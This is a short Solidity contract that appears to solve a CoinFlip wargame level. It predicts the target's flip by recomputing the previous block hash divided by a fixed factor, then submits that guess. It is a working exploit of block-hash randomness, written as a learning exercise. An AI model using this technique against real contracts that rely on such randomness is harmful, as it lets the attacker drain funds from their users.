// SPDX-License-Identifier: MIT
pragma solidity ^0.6;

import "OpenZeppelin/openzeppelin-contracts@3.0.0/contracts/math/SafeMath.sol";
import "./CoinFlip.sol";

contract GuessLocal {
    using SafeMath for uint256;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip coin_flip;

    constructor(address _t) public {
        coin_flip = CoinFlip(_t);
    }

    function guess() public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(FACTOR);
        coin_flip.flip(coinFlip == 1 ? true : false);
    }
}
